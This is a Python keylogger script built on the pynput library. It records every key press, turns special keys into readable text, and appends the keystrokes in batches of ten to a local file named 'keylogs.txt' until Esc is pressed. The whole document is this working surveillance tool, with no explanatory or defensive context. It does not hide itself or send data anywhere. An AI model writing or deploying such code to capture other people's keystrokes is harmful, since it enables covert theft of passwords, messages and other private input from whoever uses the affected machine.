from pynput import keyboard


log_file = "keylogs.txt"


keys = []


def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("tab") > 0:
                f.write('\t')
            elif k.find("Key") == -1:
                f.write(k)
            else:
                f.write(f" [{k}] ")
        f.write("\n")


def on_press(key):
    keys.append(key)
    if len(keys) >= 10:  
        write_to_file(keys)
        keys.clear()


def on_release(key):
 
    if key == keyboard.Key.esc:
        write_to_file(keys)
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
